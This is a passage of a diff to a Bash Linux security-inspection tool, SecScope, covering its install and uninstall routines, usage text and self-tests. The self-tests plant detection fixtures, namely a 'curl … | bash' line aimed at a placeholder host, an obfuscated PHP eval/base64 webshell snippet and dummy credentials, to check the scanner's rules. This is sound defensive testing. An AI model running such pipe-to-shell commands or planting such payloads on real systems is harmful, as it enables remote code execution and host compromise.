-            log_error '内置 YARA-X 执行器哈希校验失败'; return 1;
-        }
-        install -m 0500 "${PROGRAM_DIR}/runtime/${runtime_dir}/bin/yr" "/opt/secscope/runtime/${runtime_dir}/bin/yr" || return 1
-    else
-        log_error "内置 ${runtime_dir} YARA-X 执行器缺失"; return 1
-    fi
     if [ -x "${PROGRAM_DIR}/native/secscope-scanner/scanner" ]; then
         install -m 0500 "${PROGRAM_DIR}/native/secscope-scanner/scanner" /opt/secscope/native/secscope-scanner/scanner || return 1
+        install -d -m 0700 /opt/secscope/native/secscope-scanner/secscope_scanner
+        for native_module in "${PROGRAM_DIR}"/native/secscope-scanner/secscope_scanner/*.py; do
+            [ -f "$native_module" ] && [ ! -L "$native_module" ] || { log_error "native scanner Python 模块缺失: $native_module"; return 1; }
+            install -m 0500 "$native_module" "/opt/secscope/native/secscope-scanner/secscope_scanner/$(basename "$native_module")" || return 1
+        done
     else
-        log_warn 'native scanner binary 未随发布包提供，安装后将使用 Bash fallback'
+        log_warn 'native scanner 未随发布包提供，安装后将使用 Bash fallback'
     fi
     if [ -x "${PROGRAM_DIR}/native/secscope-cache/cache-daemon" ] && [ -x "${PROGRAM_DIR}/native/secscope-cache/cache-client" ]; then
         install -m 0500 "${PROGRAM_DIR}/native/secscope-cache/cache-daemon" /opt/secscope/native/secscope-cache/cache-daemon || return 1
         install -m 0500 "${PROGRAM_DIR}/native/secscope-cache/cache-client" /opt/secscope/native/secscope-cache/cache-client || return 1
+        install -d -m 0700 /opt/secscope/native/secscope-cache/secscope_cache
+        for native_module in "${PROGRAM_DIR}"/native/secscope-cache/secscope_cache/*.py; do
+            [ -f "$native_module" ] && [ ! -L "$native_module" ] || { log_error "native cache Python 模块缺失: $native_module"; return 1; }
+            install -m 0500 "$native_module" "/opt/secscope/native/secscope-cache/secscope_cache/$(basename "$native_module")" || return 1
+        done
         [ ! -L /etc/systemd/system/secscope-cache.service ] || { log_error '拒绝覆盖符号链接 cache service'; return 1; }
         install -m 0644 "${PROGRAM_DIR}/systemd/secscope-cache.service" /etc/systemd/system/secscope-cache.service || return 1
     fi
@@ -8906,15 +10023,10 @@ install_secscope() {
             'SECSCOPE_EVENT_WINDOW_MINUTES=40' \
             'SECSCOPE_WEB_ACCESS_LOG_MAX_LINES=5000' \
             'SECSCOPE_WEB_ACCESS_LOG_FORMAT=auto' \
-            'SECSCOPE_YARA_MODE=auto' \
-            'SECSCOPE_YARA_RULES=/opt/secscope/rules/yara-forge-core-20260809' \
             'SECSCOPE_MAINTENANCE_WINDOWS=' \
             'SECSCOPE_CONTEXT_ALLOW_FILE=/etc/secscope/context.allow' >> "$config_file"
     fi
     chmod 0600 "$config_file"
-    [ -n "$(read_config_value "$config_file" SECSCOPE_YARA_RULES)" ] || \
-        set_config_value "$config_file" SECSCOPE_YARA_RULES /opt/secscope/rules/yara-forge-core-20260809
-
     if [ "$SCHEDULE_CONFIG_EXPLICIT" = true ]; then
         schedule_mode="$SCHEDULE_MODE"
         schedule_time="$SCHEDULE_TIME"
@@ -9067,8 +10179,9 @@ uninstall_secscope() {
     rm -f /etc/systemd/system/secscope.timer /etc/systemd/system/secscope-fast.timer /etc/systemd/system/secscope-daily.timer /etc/systemd/system/secscope-full.timer /etc/systemd/system/secscope.service /etc/systemd/system/secscope@.service /etc/systemd/system/secscope-cache.service /etc/cron.d/secscope
     systemctl daemon-reload 2>/dev/null || true
     # 报告默认保存在程序目录，卸载时仅删除程序文件，保留 HTML 报告。
-    rm -f /opt/secscope/secscope.sh /opt/secscope/secscope.sh.sha256 /opt/secscope/scanner /opt/secscope/cache-daemon /opt/secscope/cache-client /opt/secscope/native/secscope-scanner/scanner /opt/secscope/native/secscope-cache/cache-daemon /opt/secscope/native/secscope-cache/cache-client /opt/secscope/modules/profile.sh /opt/secscope/modules/yara.sh /opt/secscope/helpers/yara_normalizer.py /opt/secscope/helpers/yara_promoter.py /opt/secscope/helpers/rat_engine.py /opt/secscope/helpers/threat_intel.py /opt/secscope/helpers/corpus_manifest.py /opt/secscope/helpers/route_static_candidates.py /opt/secscope/helpers/java/SecScopeRuntimeInspector.java /opt/secscope/helpers/java/README.md /opt/secscope/rules/ioc-local.txt /opt/secscope/rules/ioc-allow.txt /opt/secscope/rules/yara-forge-core-20260809/yara-rules-core.yar /opt/secscope/runtime/linux-amd64/bin/yr /opt/secscope/runtime/linux-arm64/bin/yr
-    rmdir /opt/secscope/native/secscope-scanner /opt/secscope/native/secscope-cache /opt/secscope/native /opt/secscope/modules /opt/secscope/helpers/java /opt/secscope/helpers /opt/secscope/rules/yara-forge-core-20260809 /opt/secscope/rules /opt/secscope/runtime/linux-amd64/bin /opt/secscope/runtime/linux-amd64 /opt/secscope/runtime/linux-arm64/bin /opt/secscope/runtime/linux-arm64 /opt/secscope/runtime 2>/dev/null || true
+    rm -f /opt/secscope/secscope.sh /opt/secscope/secscope.sh.sha256 /opt/secscope/scanner /opt/secscope/cache-daemon /opt/secscope/cache-client /opt/secscope/native/secscope-scanner/scanner /opt/secscope/native/secscope-cache/cache-daemon /opt/secscope/native/secscope-cache/cache-client /opt/secscope/modules/profile.sh /opt/secscope/helpers/rat_engine.py /opt/secscope/helpers/threat_intel.py /opt/secscope/helpers/corpus_manifest.py /opt/secscope/helpers/route_static_candidates.py /opt/secscope/rules/yara-forge/*.yar /opt/secscope/runtime/linux-amd64/bin/yr /opt/secscope/runtime/linux-arm64/bin/yr /opt/secscope/helpers/java/SecScopeRuntimeInspector.java /opt/secscope/helpers/java/README.md /opt/secscope/rules/ioc-local.txt /opt/secscope/rules/ioc-allow.txt /opt/secscope/rules/yara-forge
+    rm -rf /opt/secscope/native/secscope-scanner/secscope_scanner /opt/secscope/native/secscope-cache/secscope_cache
+  rmdir /opt/secscope/native/secscope-scanner /opt/secscope/native/secscope-cache /opt/secscope/native /opt/secscope/modules /opt/secscope/helpers/java /opt/secscope/helpers /opt/secscope/rules/yara-forge /opt/secscope/rules /opt/secscope/runtime/linux-amd64/bin /opt/secscope/runtime/linux-amd64 /opt/secscope/runtime/linux-arm64/bin /opt/secscope/runtime/linux-arm64 /opt/secscope/runtime 2>/dev/null || true
     rmdir /opt/secscope 2>/dev/null || true
     log_info "SecScope 程序已卸载；HTML 报告、状态和配置已保留"
 }
@@ -9140,6 +10253,10 @@ enforce_offline_network_policy() {
 
 cleanup() {
     [ -z "$PACKAGE_VERIFY_CACHE_FILE" ] || rm -f -- "$PACKAGE_VERIFY_CACHE_FILE" 2>/dev/null || true
+    # 持久化包索引仅在状态存储不可用（回退轮内文件）时清理。
+    if [ "$STATE_ENABLED" != true ] && [ -n "$PACKAGE_INDEX_CACHE_FILE" ]; then
+        rm -f -- "$PACKAGE_INDEX_CACHE_FILE" 2>/dev/null || true
+    fi
     if [ -f "${LOCK_FILE}.profile" ] && grep -q "^pid=$$" "${LOCK_FILE}.profile" 2>/dev/null; then rm -f "${LOCK_FILE}.profile"; fi
     if [ "$LOCK_METHOD" = "mkdir" ] && [ -n "$LOCK_FILE" ]; then
         rm -f -- "${LOCK_FILE}.d/pid" 2>/dev/null || true
@@ -9384,7 +10501,7 @@ print_usage() {
 
 巡检与状态:
   --mode hunt|full         默认 Hunt；Hunt 突出威胁/异常/IOC/攻击链，Full 同时呈现基线与运行观察
-  --profile fast-hunt|daily-hunt|full|corpus-validation  扫描档位；默认 daily-hunt
+  --profile fast-hunt|daily-hunt|full|full-diff|corpus-validation  扫描档位；默认 daily-hunt
   --corpus-root DIR        corpus-validation 的隔离样本根目录
   --corpus-manifest FILE   JSONL 清单；每行含 path，可选 sha256、sample_id、lane
   --host-role ROLE         公共角色：workstation/member-server/domain-controller/web-server/database-server/file-server/rdp-server/kubernetes/bastion/dev/generic
@@ -9394,6 +10511,7 @@ print_usage() {
   --init-state             首轮现有发现记为 BASELINE_EXISTING
   --reset-state            备份并重建状态，首轮作为基线
   --no-state               禁用跨轮记忆
+  --compare DIR            与上一轮输出目录对比，报告新增/已解决发现（F5）
   --include-sensitive      HTML 报告正文不脱敏（raw/ 原始证据始终受 0600 保护）
   --archive                完成后生成权限收紧的 .tar.gz 证据包
   --share-package          保留完整证据，并生成同级 *_share 脱敏分享副本
@@ -9418,11 +10536,13 @@ USAGE
 reset_test_findings() {
     FINDINGS=(); FINDING_SEVS=(); FINDING_CATS=(); FINDING_SUMMARIES=(); FINDING_EVIDENCES=()
     FINDING_RECOMMENDATIONS=(); FINDING_MITRES=(); FINDING_RULE_IDS=(); FINDING_ENTITY_KEYS=(); FINDING_ENTITY_TYPES=()
-    FINDING_FINGERPRINTS=(); FINDING_EVIDENCE_HASHES=(); FINDING_EVIDENCE_PART_HASHES=(); FINDING_MODULES=(); FINDING_LIFECYCLES=()
+    FINDING_FINGERPRINTS=(); FINDING_EVIDENCE_HASHES=(); FINDING_FP_KEYS=(); FINDING_EVIDENCE_PART_KEYS=(); FINDING_B64_SUMMARIES=(); FINDING_B64_ENTITIES=(); FINDING_MODULES=(); FINDING_LIFECYCLES=()
     FINDING_FIRST_SEEN=(); FINDING_LAST_SEEN=(); FINDING_OCCURRENCES=(); FINDING_RAW_REFS=(); FINDING_ID=0
     FINDING_TYPES=(); FINDING_CONFIDENCES=(); FINDING_JUDGMENT_BASES=(); FINDING_ESCALATION_CONDITIONS=()
     FINDING_EVIDENCE_DOMAINS=(); FINDING_DOMAIN_COUNTS=(); FINDING_COUNTER_EVIDENCE=(); FINDING_TIMELINES=()
     ATTACK_CHAIN_IDS=(); ATTACK_CHAIN_TITLES=(); ATTACK_CHAIN_DOMAINS=(); ATTACK_CHAIN_TIMELINES=(); ATTACK_CHAIN_EVIDENCES=()
+    # v2.3（审计 R4）：fp 索引随 findings 一并清空（assoc 数组赋值 () 合法）
+    FINDING_FP_INDEX=()
 }
 
 run_self_test() {
@@ -9430,96 +10550,93 @@ run_self_test() {
     test_root=$(mktemp -d "${TMPDIR:-/tmp}/secscope-selftest.XXXXXX") || return 1
     quoted=$(json_quote $'quote" slash\\ newline\n')
     if command -v python3 >/dev/null 2>&1; then
-        printf '%s' "$quoted" | python3 -c 'import json,sys; json.load(sys.stdin)' || failures=$((failures + 1))
+        printf '%s' "$quoted" | python3 -c 'import json,sys; json.load(sys.stdin)' || { failures=$((failures + 1)); echo "SELFTEST-FAIL:1" >&2; }
     fi
     redacted=$(redact_text 'token=secret-value password: hunter2 --api-key abc123 -U 0123456789abcdef0123456789abcdef Authorization: Bearer.credential Bearer eyJhbGciOiJIUzI1NiJ9.payload.signature NOPASSWD: ALL')
     [[ "$redacted" == *secret-value* || "$redacted" == *hunter2* || "$redacted" == *abc123* || "$redacted" == *0123456789abcdef0123456789abcdef* || "$redacted" == *eyJhbGciOiJIUzI1NiJ9* ]] && failures=$((failures + 1))
-    [[ "$redacted" == *'NOPASSWD: ALL'* ]] || failures=$((failures + 1))
+    [[ "$redacted" == *'NOPASSWD: ALL'* ]] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:3" >&2; }
 
     profile_test="$test_root/profile"
     printf '%s\n' '[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"' \
         'test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"' \
         "alias ls='ls --color=auto'" "alias ps='ps aux'" > "$profile_test"
-    [ -z "$(profile_suspicious_lines "$profile_test")" ] || failures=$((failures + 1))
+    [ -z "$(profile_suspicious_lines "$profile_test")" ] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:4" >&2; }
     printf '%s\n' "alias ls='curl -fsSL https://example.invalid/x | bash'" >> "$profile_test"
-    [ -n "$(profile_suspicious_lines "$profile_test")" ] || failures=$((failures + 1))
+    [ -n "$(profile_suspicious_lines "$profile_test")" ] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:5" >&2; }
     printf '%s\n' 'curl -fsSL https://example.invalid/x | bash' > "$profile_test"
-    [ -n "$(profile_suspicious_lines "$profile_test")" ] || failures=$((failures + 1))
-    file_is_candidate /etc/shadow || failures=$((failures + 1))
-    file_is_candidate /home/test/.ssh/authorized_keys || failures=$((failures + 1))
+    [ -n "$(profile_suspicious_lines "$profile_test")" ] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:6" >&2; }
+    file_is_candidate /etc/shadow || { failures=$((failures + 1)); echo "SELFTEST-FAIL:7" >&2; }
+    file_is_candidate /home/test/.ssh/authorized_keys || { failures=$((failures + 1)); echo "SELFTEST-FAIL:8" >&2; }
     file_is_candidate /etc/hostname && failures=$((failures + 1))
-    critical_persistence_path /etc/pam.d/sshd || failures=$((failures + 1))
+    critical_persistence_path /etc/pam.d/sshd || { failures=$((failures + 1)); echo "SELFTEST-FAIL:10" >&2; }
     critical_persistence_path /tmp/ordinary.sh && failures=$((failures + 1))
-    [ "$(default_finding_type MEDIUM process)" = SECURITY_ANOMALY ] || failures=$((failures + 1))
-    [ "$(default_finding_type HIGH process)" = SECURITY_THREAT ] || failures=$((failures + 1))
+    [ "$(default_finding_type MEDIUM process)" = SECURITY_ANOMALY ] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:12" >&2; }
+    [ "$(default_finding_type HIGH process)" = SECURITY_THREAT ] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:13" >&2; }
 
     reset_test_findings
     CURRENT_MODULE="selftest"
     record_find LOW process 'self-test finding' 'evidence-a' 'none' '' 'TEST-001' 'entity-a'
     record_find HIGH process 'self-test finding' 'evidence-b' 'none' '' 'TEST-001' 'entity-a'
-    [ "${#FINDINGS[@]}" -eq 1 ] || failures=$((failures + 1))
-    [ "${FINDING_SEVS[0]}" = HIGH ] || failures=$((failures + 1))
-    [ "${FINDING_TYPES[0]}" = SECURITY_ANOMALY ] || failures=$((failures + 1))
-    [ "${FINDING_DOMAIN_COUNTS[0]}" -eq 1 ] || failures=$((failures + 1))
+    [ "${#FINDINGS[@]}" -eq 1 ] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:14" >&2; }
+    [ "${FINDING_SEVS[0]}" = HIGH ] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:15" >&2; }
+    [ "${FINDING_TYPES[0]}" = SECURITY_ANOMALY ] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:16" >&2; }
+    [ "${FINDING_DOMAIN_COUNTS[0]}" -eq 1 ] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:17" >&2; }
 
     # 普通 Web 应用调用 eval/system/base64_decode 不应仅凭关键字命中。
     printf '%s\n' '<?php $x=base64_decode($input); if ($debug) { system("id"); } eval($trustedTemplate); ?>' > "$test_root/normal.php"
-    [ "$(web_static_structure_score "$test_root/normal.php" | cut -f1)" -eq 0 ] || failures=$((failures + 1))
+    [ "$(web_static_structure_score "$test_root/normal.php" | cut -f1)" -eq 0 ] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:18" >&2; }
     printf '%s\n' '<?php $f="ev"."al"; $f(gzinflate(base64_decode($payload))); ?>' > "$test_root/obfuscated.php"
-    [ "$(web_static_structure_score "$test_root/obfuscated.php" | cut -f1)" -ge 4 ] || failures=$((failures + 1))
-    local file_entity_before file_entity_after yara_init_line static_scan_line
+    [ "$(web_static_structure_score "$test_root/obfuscated.php" | cut -f1)" -ge 4 ] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:19" >&2; }
+    local file_entity_before file_entity_after static_scan_line
     file_entity_before=$(stable_linux_entity "$test_root/obfuscated.php" fixture)
     printf '%s\n' '// changed non-executable fixture' >> "$test_root/obfuscated.php"
     file_entity_after=$(stable_linux_entity "$test_root/obfuscated.php" fixture)
-    [[ "$file_entity_before" == file:* && "$file_entity_before" == *obfuscated.php:* && "$file_entity_before" != "$file_entity_after" ]] || failures=$((failures + 1))
-    yara_init_line=$(grep -n '^[[:space:]]*initialize_yara_capability$' "$PROGRAM_DIR/secscope.sh" | head -1 | cut -d: -f1)
-    static_scan_line=$(grep -n '^[[:space:]]*scan_web_static_structures$' "$PROGRAM_DIR/secscope.sh" | head -1 | cut -d: -f1)
-    [[ "$yara_init_line" =~ ^[0-9]+$ && "$static_scan_line" =~ ^[0-9]+$ && "$yara_init_line" -lt "$static_scan_line" ]] || failures=$((failures + 1))
-    declare -f correlate_web_attack_chain | grep -q 'process_instance_id=' || failures=$((failures + 1))
-    declare -f correlate_web_attack_chain | grep -q 'CONTEXT_ONLY_NO_PID' || failures=$((failures + 1))
+    [[ "$file_entity_before" == file:* && "$file_entity_before" == *obfuscated.php:* && "$file_entity_before" != "$file_entity_after" ]] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:20" >&2; }
+    declare -f correlate_web_attack_chain | grep -q 'process_instance_id=' || { failures=$((failures + 1)); echo "SELFTEST-FAIL:21" >&2; }
+    declare -f correlate_web_attack_chain | grep -q 'CONTEXT_ONLY_NO_PID' || { failures=$((failures + 1)); echo "SELFTEST-FAIL:22" >&2; }
     reset_test_findings
     record_find HIGH process 'two-domain anomaly' 'process and network' 'review' '' 'TEST-TWO-DOMAIN' 'two' '' 'SECURITY_THREAT' HIGH 'test' 'add one domain' 'PROCESS,NETWORK'
-    [ "${FINDING_TYPES[0]}" = SECURITY_ANOMALY ] || failures=$((failures + 1))
+    [ "${FINDING_TYPES[0]}" = SECURITY_ANOMALY ] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:23" >&2; }
     record_find HIGH process 'three-domain threat' 'process file network' 'respond' '' 'TEST-THREE-DOMAIN' 'three' '' 'SECURITY_THREAT' HIGH 'test' 'none' 'PROCESS,FILE,NETWORK'
-    [ "${FINDING_TYPES[1]}" = SECURITY_THREAT ] || failures=$((failures + 1))
-    ipv4_in_cidr 10.20.30.40 10.20.0.0/16 || failures=$((failures + 1))
+    [ "${FINDING_TYPES[1]}" = SECURITY_THREAT ] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:24" >&2; }
+    ipv4_in_cidr 10.20.30.40 10.20.0.0/16 || { failures=$((failures + 1)); echo "SELFTEST-FAIL:25" >&2; }
     ipv4_in_cidr 10.21.30.40 10.20.0.0/16 && failures=$((failures + 1))
     ALLOWED_PORT_RULES=('TCP/8000-8999' '53')
-    is_allowed_listener_port 8443 TCP || failures=$((failures + 1))
+    is_allowed_listener_port 8443 TCP || { failures=$((failures + 1)); echo "SELFTEST-FAIL:27" >&2; }
     is_allowed_listener_port 8443 UDP && failures=$((failures + 1))
-    is_allowed_listener_port 53 UDP || failures=$((failures + 1))
+    is_allowed_listener_port 53 UDP || { failures=$((failures + 1)); echo "SELFTEST-FAIL:29" >&2; }
 
     STATE_DIR="$test_root/state"; INIT_STATE=true; RESET_STATE=false; STATE_ENABLED=true
     MODULE_IDS=(selftest); MODULE_NAMES=(selftest); MODULE_STATUSES=(SUCCESS); MODULE_DURATIONS=(0); MODULE_ERRORS=("")
-    prepare_state_store || failures=$((failures + 1))
-    reconcile_state || failures=$((failures + 1))
-    [ "${FINDING_LIFECYCLES[0]}" = BASELINE_EXISTING ] || failures=$((failures + 1))
-    [ -s "$STATE_COMMIT_PENDING" ] || failures=$((failures + 1))
-    commit_alert_state || failures=$((failures + 1))
+    prepare_state_store || { failures=$((failures + 1)); echo "SELFTEST-FAIL:30" >&2; }
+    reconcile_state || { failures=$((failures + 1)); echo "SELFTEST-FAIL:31" >&2; }
+    [ "${FINDING_LIFECYCLES[0]}" = BASELINE_EXISTING ] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:32" >&2; }
+    [ -s "$STATE_COMMIT_PENDING" ] || { failures=$((failures + 1)); echo "SELFTEST-FAIL:33" >&2; }
+    commit_alert_state || { failures=$((failures + 1)); echo "SELFTEST-FAIL:34" >&2; }
     RAW_DIR="$test_root/raw"; mkdir -p "$RAW_DIR"
     printf 'self-test evidence\n' | dump_raw "sample.txt"
     RUN_FINISHED_AT=$(date -u +%Y-%m-%dT%H:%M:%SZ)
-    generate_evidence_manifest || failures=$((failures + 1))
-    grep -q 'sample.txt' "$RAW_DIR/manifest.sha256" 2>/dev/null || failures=$((failures + 1))
-    grep -q '"sha256"' "$RAW_DIR/manifest.json" 2>/dev/null || failures=$((failures + 1))
+    generate_evidence_manifest || { failures=$((failures + 1)); echo "SELFTEST-FAIL:35" >&2; }
+    grep -q 'sample.txt' "$RAW_DIR/manifest.sha256" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:36" >&2; }
+    grep -q '"sha256"' "$RAW_DIR/manifest.json" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:37" >&2; }
     AUTH_BEHAVIOR_ENABLED=true; AUTH_MAX_EVENTS=20; CURRENT_MODULE=logs
     AUTH_EVENTS='Jul 31 01:02:03 host sshd[123]: Accepted password for selftest from 8.8.8.8 port 50123 ssh2'
-    analyze_ssh_auth_behavior || failures=$((failures + 1))
-    grep -q '|selftest|8.8.8.8|password|' "$AUTH_PROFILE_FILE" 2>/dev/null || failures=$((failures + 1))
-    valid_schedule_time '03:45' || failures=$((failures + 1))
+    analyze_ssh_auth_behavior || { failures=$((failures + 1)); echo "SELFTEST-FAIL:38" >&2; }
+    grep -q '|selftest|8.8.8.8|password|' "$AUTH_PROFILE_FILE" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:39" >&2; }
+    valid_schedule_time '03:45' || { failures=$((failures + 1)); echo "SELFTEST-FAIL:40" >&2; }
     valid_schedule_time '24:00' && failures=$((failures + 1))
-    write_timer_unit "$test_root/daily.timer" daily '03:45' || failures=$((failures + 1))
-    grep -q '^OnCalendar=\*-\*-\* 03:45:00$' "$test_root/daily.timer" 2>/dev/null || failures=$((failures + 1))
-    write_profile_timer_unit "$test_root/fast.timer" fast-hunt '30min' fast-hunt || failures=$((failures + 1))
-    grep -q '^OnBootSec=3min$' "$test_root/fast.timer" 2>/dev/null || failures=$((failures + 1))
-    write_profile_timer_unit "$test_root/daily.timer" daily-hunt '2h' none || failures=$((failures + 1))
-    grep -q '^OnActiveSec=2h$' "$test_root/daily.timer" 2>/dev/null || failures=$((failures + 1))
-    valid_cron_expression '0 */1 * * *' || failures=$((failures + 1))
-    valid_cron_expression '*/15 9-17 * * 1-5' || failures=$((failures + 1))
+    write_timer_unit "$test_root/daily.timer" daily '03:45' || { failures=$((failures + 1)); echo "SELFTEST-FAIL:42" >&2; }
+    grep -q '^OnCalendar=\*-\*-\* 03:45:00$' "$test_root/daily.timer" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:43" >&2; }
+    write_profile_timer_unit "$test_root/fast.timer" fast-hunt '30min' fast-hunt || { failures=$((failures + 1)); echo "SELFTEST-FAIL:44" >&2; }
+    grep -q '^OnBootSec=3min$' "$test_root/fast.timer" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:45" >&2; }
+    write_profile_timer_unit "$test_root/daily.timer" daily-hunt '2h' none || { failures=$((failures + 1)); echo "SELFTEST-FAIL:46" >&2; }
+    grep -q '^OnActiveSec=2h$' "$test_root/daily.timer" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:47" >&2; }
+    valid_cron_expression '0 */1 * * *' || { failures=$((failures + 1)); echo "SELFTEST-FAIL:48" >&2; }
+    valid_cron_expression '*/15 9-17 * * 1-5' || { failures=$((failures + 1)); echo "SELFTEST-FAIL:49" >&2; }
     valid_cron_expression '0 0 32 * *' && failures=$((failures + 1))
     valid_cron_expression '0 */0 * * *' && failures=$((failures + 1))
-    write_cron_file "$test_root/secscope.cron" '0 */1 * * *' || failures=$((failures + 1))
-    grep -q '^0 \*/1 \* \* \* root .*systemctl start --no-block secscope.service' "$test_root/secscope.cron" 2>/dev/null || failures=$((failures + 1))
+    write_cron_file "$test_root/secscope.cron" '0 */1 * * *' || { failures=$((failures + 1)); echo "SELFTEST-FAIL:52" >&2; }
+    grep -qE '^0 \*/1 \* \* \* root .*systemctl start --no-block .*secscope\.service' "$test_root/secscope.cron" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:53" >&2; }
 
     # 报告、证据域门禁、RAT 证据图、排序、筛选与完整性自检。
     reset_test_findings
@@ -9539,45 +10656,47 @@ run_self_test() {
     printf 'self-test raw evidence\n' > "$RAW_DIR/sample.txt"
     HTML_FILE="$OUTPUT_DIR/report_selftest.html"
     recalculate_severity_counts
-    generate_html_report 'self test' || failures=$((failures + 1))
-    grep -q 'Linux 主机安全巡检报告' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
-    grep -q 'critical finding' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
-    grep -q 'low finding' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
-    grep -q 'data-section="threat"' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
-    grep -q '已确认或高置信安全威胁' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
-    grep -q '待研判安全异常' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
-    grep -q 'report-confidence' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
-    grep -q 'class="evidence-row" hidden><td colspan="5"' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
-    grep -Eq 'LOCAL_IPS_PLACEHOLDER|PROFILE_PLACEHOLDER|THREAT_TOTAL_VALUE|THREAT_CRITICAL_VALUE|THREAT_HIGH_VALUE|CHANGE_TOTAL_VALUE|MODULE_COUNT_VALUE|ENDPOINT_TABLE|CHANGE_STATS|RAW_ROWS|ANOMALY_TABLE|TRUST_TABLE|OBSERVATION_TABLE|FILE_TABLE|YARA_TABLE|ABNORMAL_CONNECTION_TABLE|COMPONENT_TABLE|VISIBILITY_TEXT|VISIBILITY_TABLE' "$HTML_FILE" 2>/dev/null && failures=$((failures + 1))
-    grep -q 'YARA 命中' "$HTML_FILE" 2>/dev/null || failures=$((failures + 1))
-    write_findings_json || failures=$((failures + 1))
-    write_status_json 'self test' || failures=$((failures + 1))
-    generate_evidence_manifest || failures=$((failures + 1))
-    write_raw_manifest || failures=$((failures + 1))
+    # v2.3：v2 渲染器消费 findings.json/status.json——直接调用渲染前必须先落盘。
+    write_findings_json > /dev/null 2>&1 || { failures=$((failures + 1)); echo "SELFTEST-FAIL:54a" >&2; }
+    write_status_json 'self test' > /dev/null 2>&1 || { failures=$((failures + 1)); echo "SELFTEST-FAIL:54b" >&2; }
+    generate_html_report 'self test' || { failures=$((failures + 1)); echo "SELFTEST-FAIL:54" >&2; }
+    grep -q 'SecScope 安全巡检报告' "$HTML_FILE" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:55" >&2; }
+    grep -q 'critical finding' "$HTML_FILE" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:56" >&2; }
+    grep -q 'low finding' "$HTML_FILE" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:57" >&2; }
+    grep -q 'data-type="SECURITY_THREAT"' "$HTML_FILE" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:58" >&2; }
+    grep -q '威胁发现' "$HTML_FILE" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:59" >&2; }
+    grep -q '待研判异常' "$HTML_FILE" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:60" >&2; }
+    grep -q 'conf-tag' "$HTML_FILE" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:61" >&2; }
+    grep -q 'ev-grid' "$HTML_FILE" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:62" >&2; }
+    grep -Eq 'LOCAL_IPS_PLACEHOLDER|PROFILE_PLACEHOLDER|THREAT_TOTAL_VALUE|THREAT_CRITICAL_VALUE|THREAT_HIGH_VALUE|CHANGE_TOTAL_VALUE|MODULE_COUNT_VALUE|ENDPOINT_TABLE|CHANGE_STATS|RAW_ROWS|ANOMALY_TABLE|TRUST_TABLE|OBSERVATION_TABLE|FILE_TABLE|ABNORMAL_CONNECTION_TABLE|COMPONENT_TABLE|VISIBILITY_TEXT|VISIBILITY_TABLE' "$HTML_FILE" 2>/dev/null && failures=$((failures + 1))
+    write_findings_json || { failures=$((failures + 1)); echo "SELFTEST-FAIL:64" >&2; }
+    write_status_json 'self test' || { failures=$((failures + 1)); echo "SELFTEST-FAIL:65" >&2; }
+    generate_evidence_manifest || { failures=$((failures + 1)); echo "SELFTEST-FAIL:66" >&2; }
+    write_raw_manifest || { failures=$((failures + 1)); echo "SELFTEST-FAIL:67" >&2; }
     printf '%s  %s\n' "$(sha256_file "$HTML_FILE")" "$(basename "$HTML_FILE")" > "$OUTPUT_DIR/report.sha256"
-    write_integrity_verifier || failures=$((failures + 1))
+    write_integrity_verifier || { failures=$((failures + 1)); echo "SELFTEST-FAIL:68" >&2; }
     printf 'transient\n' > "$OUTPUT_DIR/.file_inventory.pending"
-    write_report_manifest || failures=$((failures + 1))
+    write_report_manifest || { failures=$((failures + 1)); echo "SELFTEST-FAIL:69" >&2; }
     grep -q 'file_inventory.pending' "$OUTPUT_DIR/report-manifest.json" 2>/dev/null && failures=$((failures + 1))
-    bash "$OUTPUT_DIR/verify-report.sh" >/dev/null || failures=$((failures + 1))
+    bash "$OUTPUT_DIR/verify-report.sh" >/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:71" >&2; }
     printf 'untracked evidence\n' > "$OUTPUT_DIR/untracked.txt"
     if command -v python3 >/dev/null 2>&1; then
         bash "$OUTPUT_DIR/verify-report.sh" >/dev/null 2>&1 && failures=$((failures + 1))
     else
-        bash "$OUTPUT_DIR/verify-report.sh" >/dev/null 2>&1 || failures=$((failures + 1))
